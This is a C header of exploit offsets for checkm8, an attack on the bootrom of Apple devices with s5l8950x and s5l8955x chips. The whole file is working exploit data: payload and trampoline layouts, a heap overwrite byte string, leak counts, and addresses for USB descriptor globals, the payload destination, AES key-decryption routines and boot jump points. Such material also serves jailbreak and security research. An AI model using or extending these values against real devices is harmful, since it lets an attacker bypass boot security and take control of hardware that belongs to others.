#ifndef CHECKM8_OFFSETS_H
#define CHECKM8_OFFSETS_H

#include <stdint.h>
#include <stddef.h>

#define TRAMPOLINE_SIZE_ARMV7 (sizeof(uint64_t))
#define PAYLOAD_OFFSET_ARMV7 384
#define PAYLOAD_SIZE_ARMV7 (320 - TRAMPOLINE_SIZE_ARMV7)

#define IMG3_MAGIC 0x496D6733
#define TAG_KBAG 0x4b424147
#define TAG_DATA 0x44415441
#define AES_TYPE_GID 0x20000200
#define AES_MODE_256 0x20000000

#define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
#define S5l8955X_OVERWRITE S5l8950X_OVERWRITE

typedef struct {
	uint32_t large_leak;
	uint32_t overwrite_offset;
	unsigned char* overwrite;
	size_t overwrite_len;
} checkm8_config_t;

typedef struct {
	char checkm8_exploit[PAYLOAD_OFFSET_ARMV7];
	char trampoline[TRAMPOLINE_SIZE_ARMV7];
	char checkm8_handler[PAYLOAD_SIZE_ARMV7];
} checkm8_payload_t;

typedef struct {
	uint32_t gUSBDescriptors;
	uint32_t gUSBSerialNumber;
	uint32_t usb_create_string_descriptor;
	uint32_t gUSBSRNMStringDescriptor;
	uint32_t payload_dest;
	uint32_t payload_offset;
	uint32_t payload_size;
	uint32_t payload_ptr;
} checkm8_exploit_offsets_t;

typedef struct {
	uint32_t load_address;
	uint32_t img_magic;
	uint32_t tag_data;
	uint32_t tag_kbag;
	uint32_t aes_type_gid;
	uint32_t aes_crypto_command;
	uint32_t aes_mode_256;
	uint32_t get_boot_trampoline;
	uint32_t jumpto;
} checkm8_handler_offsets_t;

/* Offsets for s5l8950x */
checkm8_config_t s5l8950x_config = {.large_leak = 659, .overwrite_offset = 0x640, .overwrite = S5l8950X_OVERWRITE, .overwrite_len = 28};
checkm8_exploit_offsets_t s5l8950x_exploit_offsets = {.gUSBDescriptors = 0x10061988, .gUSBSerialNumber = 0x10061F80, .usb_create_string_descriptor = 0x7C54+1, .gUSBSRNMStringDescriptor = 0x100600D8, .payload_dest = 0x10079800, .payload_offset = PAYLOAD_OFFSET_ARMV7, .payload_size = (PAYLOAD_SIZE_ARMV7 + TRAMPOLINE_SIZE_ARMV7), .payload_ptr = 0x10061A24};
checkm8_handler_offsets_t s5l8950x_handler_offsets = {.load_address = 0x10000000, .img_magic = IMG3_MAGIC, .tag_data = TAG_DATA, .tag_kbag = TAG_KBAG, .aes_type_gid = AES_TYPE_GID, .aes_crypto_command = 0x7300+1, .aes_mode_256 = AES_MODE_256, .get_boot_trampoline = 0x6E84+1, .jumpto = 0x5F80+1};

/* Offsets for s5l8955x */
checkm8_config_t s5l8955x_config = {.large_leak = 659, .overwrite_offset = 0x640, .overwrite = S5l8950X_OVERWRITE, .overwrite_len = 28};
checkm8_exploit_offsets_t s5l8955x_exploit_offsets = {.gUSBDescriptors = 0x10061988, .gUSBSerialNumber = 0x10061F80, .usb_create_string_descriptor = 0x7C94+1, .gUSBSRNMStringDescriptor = 0x100600D8, .payload_dest = 0x10079800, .payload_offset = PAYLOAD_OFFSET_ARMV7, .payload_size = (PAYLOAD_SIZE_ARMV7 + TRAMPOLINE_SIZE_ARMV7), .payload_ptr = 0x10061A24};
checkm8_handler_offsets_t s5l8955x_handler_offsets = {.load_address = 0x10000000, .img_magic = IMG3_MAGIC, .tag_data = TAG_DATA, .tag_kbag = TAG_KBAG, .aes_type_gid = AES_TYPE_GID, .aes_crypto_command = 0x7340+1, .aes_mode_256 = AES_MODE_256, .get_boot_trampoline = 0x6EC4+1, .jumpto = 0x5FC0+1};


#endif